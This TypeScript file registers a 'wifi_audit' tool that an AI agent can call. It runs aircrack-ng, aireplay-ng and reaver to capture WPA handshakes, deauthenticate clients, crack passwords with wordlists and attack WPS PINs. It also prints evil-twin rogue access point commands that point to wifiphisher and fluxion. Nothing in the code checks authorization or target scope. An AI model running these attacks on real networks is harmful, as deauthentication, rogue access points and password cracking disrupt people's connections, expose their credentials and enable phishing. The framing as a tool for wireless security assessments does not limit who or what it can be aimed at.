export * as WifiAuditTool from "./wifi-audit"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "wifi_audit"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "WiFi audit action: 'scan' (discover nearby networks), 'handshake' (capture WPA handshake for cracking), 'deauth' (deauthenticate a client to force handshake), 'crack' (crack captured handshake), 'evil_twin' (set up rogue AP), 'wps_pin' (WPS PIN attack), 'list_ifaces' (list wireless interfaces in monitor mode)",
  }),
  interface: Schema.String.pipe(Schema.optional).annotate({
    description: "Wireless interface in monitor mode (e.g. wlan0mon). Required for most actions.",
  }),
  bssid: Schema.String.pipe(Schema.optional).annotate({
    description: "Target BSSID (access point MAC) for handshake capture, deauth, or crack.",
  }),
  channel: Schema.Number.pipe(Schema.optional).annotate({
    description: "Target channel number.",
  }),
  client_mac: Schema.String.pipe(Schema.optional).annotate({
    description: "Target client MAC address for deauth attack.",
  }),
  handshake_file: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to captured handshake file (.cap) for crack action.",
  }),
  wordlist: Schema.String.pipe(Schema.optional).annotate({
    description: "Wordlist for cracking. Default: /usr/share/wordlists/rockyou.txt",
  }),
  ssid: Schema.String.pipe(Schema.optional).annotate({
    description: "Target SSID (network name) for evil_twin or scan filter.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Audit WiFi networks: discover nearby access points, capture WPA/WPA2 handshakes for offline cracking, perform deauthentication attacks to force handshakes, crack captured handshakes with wordlists, set up evil twin rogue access points, and attack WPS PINs. Uses aircrack-ng suite. Requires a wireless adapter supporting monitor mode. Essential for wireless security assessments.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const iface = input.interface ?? "wlan0"
              const wordlist = input.wordlist ?? "/usr/share/wordlists/rockyou.txt"

              switch (input.action) {
                case "list_ifaces": {
                  const cmd = ChildProcess.make("iwconfig", [], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "iwconfig not found. Linux only.\nTo enable monitor mode:\nairmon-ng start wlan0\nThis creates wlan0mon.",
                  }
                }

                case "scan": {
                  const cmd = ChildProcess.make("airodump-ng", [iface, "--write-interval", "1", "-w", "./wifi-scan"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "airodump-ng failed. Requires monitor mode interface and root. Put adapter in monitor mode first:\nairmon-ng start wlan0",
                  }
                }

                case "handshake": {
                  if (!input.bssid) return { output: "ERROR: 'bssid' required for handshake capture." }
                  const args: string[] = ["-c", String(input.channel ?? 1), "--bssid", input.bssid, "-w", `./handshake_${Date.now()}`, iface]
                  const cmd = ChildProcess.make("airodump-ng", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Handshake capture failed. Target may not have active clients. Try deauth first.",
                  }
                }

                case "deauth": {
                  if (!input.bssid) return { output: "ERROR: 'bssid' required for deauth." }
                  const args: string[] = ["--deauth", "5", "-a", input.bssid]
                  if (input.client_mac) args.push("-c", input.client_mac)
                  args.push(iface)
                  const cmd = ChildProcess.make("aireplay-ng", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Deauth failed. Requires monitor mode + root.",
                  }
                }

                case "crack": {
                  const capFile = input.handshake_file ?? "./handshake-01.cap"
                  const cmd = ChildProcess.make("aircrack-ng", ["-w", wordlist, "-b", input.bssid ?? "", capFile], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(30), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  const output = result?.output?.toString("utf8") ?? ""
                  const cracked = output.includes("KEY FOUND")
                  return {
                    exit: result?.exitCode,
                    output: cracked
                      ? `🎉 PASSWORD CRACKED!\n${output}`
                      : `Crack attempt finished. ${output || "No match found with current wordlist. Try a different wordlist or hashcat."}`,
                  }
                }

                case "evil_twin": {
                  if (!input.ssid) return { output: "ERROR: 'ssid' required for evil_twin." }
                  return {
                    output: `Evil Twin setup requires multiple steps. Run these via bash:\n\n` +
                      `1. Create rogue AP:\n   airbase-ng -a <fake_mac> --essid "${input.ssid}" -c ${input.channel ?? 6} ${iface}\n\n` +
                      `2. Enable IP forwarding + DHCP:\n   sysctl -w net.ipv4.ip_forward=1\n   dnsmasq --interface=at0 --dhcp-range=192.168.50.10,192.168.50.100,12h\n\n` +
                      `3. Set up captive portal (optional):\n   Use hostapd-mana or Wifiphisher\n\n` +
                      `4. Deauth clients from original AP to force connection:\n   aireplay-ng --deauth 0 -a ${input.bssid ?? "ORIGINAL_BSSID"} ${iface}\n\n` +
                      `Or use automated tools:\n   wifiphisher -aI ${iface} -e "${input.ssid}"\n   fluxion -i ${iface}`,
                  }
                }

                case "wps_pin": {
                  if (!input.bssid) return { output: "ERROR: 'bssid' required for WPS PIN attack." }
                  const cmd = ChildProcess.make("reaver", ["-i", iface, "-b", input.bssid, "-vv", "-K", "1"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(15), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Reaver failed. Target may not have WPS enabled or is locked. Try: reaver -i " + iface + " -b " + input.bssid + " -vv -K 1",
                  }
                }

                default:
                  return { output: `Unknown action: ${input.action}. Supported: scan, handshake, deauth, crack, evil_twin, wps_pin, list_ifaces` }
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "WiFi audit failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/wifi-audit",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
